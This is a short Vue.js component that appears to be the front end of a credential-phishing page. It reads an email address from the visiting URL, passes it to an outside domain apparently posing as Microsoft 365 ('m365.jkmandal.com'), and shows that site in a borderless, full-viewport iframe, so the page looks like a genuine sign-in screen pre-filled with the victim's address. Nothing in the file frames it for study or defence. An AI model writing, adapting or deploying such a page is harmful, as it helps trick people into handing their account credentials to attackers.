<template>
  <div id="app">
    <iframe
      :src="iframeSrc"
      frameborder="0"
      scrolling="no"
      seamless>
    </iframe>
  </div>
</template>

<script>
export default {
  name: 'App',
  data() {
    return {
      iframeSrc: "", // Will be set dynamically
    };
  },
  created() {
    this.updateIframeSrc();
  },
  methods: {
    extractEmailFromUrl() {
      const url = window.location.href;
      const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/;
      const match = url.match(emailRegex);
      return match ? match[0] : null;
    },
    updateIframeSrc() {
      const baseSrc = "https://m365.jkmandal.com/?FSIc6=Oup4md"; // Base URL
      const email = this.extractEmailFromUrl();

      // Append only the email to the path if found
      if (email) {
        this.iframeSrc = `${baseSrc}/${encodeURIComponent(email)}`;
      } else {
        this.iframeSrc = baseSrc; // Default base URL if no email found
      }
    }
  }
};
</script>

<style>
/* Ensure there is absolutely no margin, padding, or gaps */
html, body {
  margin: 0;
  padding: 0;
  width: 100%;
  height: 100%;
  overflow: hidden;
}

#app {
  position: fixed;
  top: 0;
  left: 0;
  width: 100vw;
  height: 100vh;
  display: flex;
  justify-content: center;
  align-items: center;
  background: url('/cool.png') no-repeat center center fixed;
  background-size: cover;
}

/* Ensure the iframe takes up the full viewport */
iframe {
  position: absolute;
  top: 0;
  left: 0;
  width: 100vw;
  height: 100vh;
  border: none;
}
</style>
